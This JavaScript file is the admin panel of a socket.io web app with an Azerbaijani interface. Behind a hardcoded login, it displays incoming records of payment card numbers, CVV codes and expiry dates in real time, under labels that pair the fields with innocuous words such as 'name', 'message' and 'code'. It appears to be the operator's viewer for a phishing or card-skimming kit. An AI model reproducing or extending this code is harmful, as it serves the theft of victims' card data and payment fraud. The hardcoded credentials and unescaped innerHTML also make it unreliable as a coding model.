const socket = io();

function login() {
    const username = document.getElementById('usernameInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();
    
    if (username === 'ursamajor' && password === 'ursa618') {
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('adminPanel').style.display = 'block';
        
        // Connect to admin socket
        socket.emit('admin-connect');
        
        // Listen for existing messages
        socket.on('all-messages', (messages) => {
            displayMessages(messages);
        });
        
        // Listen for new messages
        socket.on('message-received', (message) => {
            addMessage(message);
        });
    } else {
        document.getElementById('errorMessage').textContent = 'İstifadəçi adı və ya şifrə yanlışdır';
    }
}

function displayMessages(messages) {
    const container = document.getElementById('messagesContainer');
    
    if (messages.length === 0) {
        container.innerHTML = '<div class="no-messages">Hələ ki mesaj yoxdur</div>';
        return;
    }
    
    container.innerHTML = '';
    messages.forEach(message => {
        addMessage(message);
    });
}

function addMessage(message) {
    const container = document.getElementById('messagesContainer');
    
    // Remove "no messages" text if it exists
    const noMessages = container.querySelector('.no-messages');
    if (noMessages) {
        noMessages.remove();
    }
    
    const messageCard = document.createElement('div');
    messageCard.className = 'message-card';
    
    const date = new Date(message.timestamp);
    const timeString = date.toLocaleString('az-AZ', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    messageCard.innerHTML = `
        <div class="message-header">
            <span class="message-id">#${message.id}</span>
            <span class="message-time">${timeString}</span>
        </div>
        <div class="message-field">
            <div class="message-label">Ad (Kart nömrəsi):</div>
            <div class="message-value">${message.cardNumber}</div>
        </div>
        <div class="message-field">
            <div class="message-label">Mesaj (CVV):</div>
            <div class="message-value">${message.cvv}</div>
        </div>
        <div class="message-field">
            <div class="message-label">Kod (İstifadə müddəti):</div>
            <div class="message-value">${message.expiry}</div>
        </div>
    `;
    
    container.insertBefore(messageCard, container.firstChild);
}

// Handle Enter key for login
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('usernameInput')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') login();
    });
    
    document.getElementById('passwordInput')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') login();
    });
});
